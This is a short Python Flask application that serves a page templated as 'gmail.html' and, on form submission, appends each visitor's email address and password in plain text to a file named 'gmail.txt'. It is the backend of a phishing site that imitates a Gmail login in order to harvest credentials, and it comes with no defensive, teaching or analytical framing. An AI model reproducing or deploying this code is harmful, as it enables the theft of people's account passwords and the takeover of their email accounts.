from flask import Flask, render_template, request
import cgi

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("gmail.html")

@app.route("/submit" , methods=["POST"])
def submit():
    try:
        email = request.form["email"]
        password = request.form["password"]

        f = open("gmail.txt", "a")
        f.write("User: ")
        f.write(email)
        f.write("\t\t")
        f.write("Password: ")
        f.write(password)
        f.close()

        return render_template("gmail_ans.html")

    except Exception as ex:
        return f"sorry not successful the error was  : {ex} "



@app.errorhandler(404)
def showError(error):
    return render_template("error_404.html"), 404
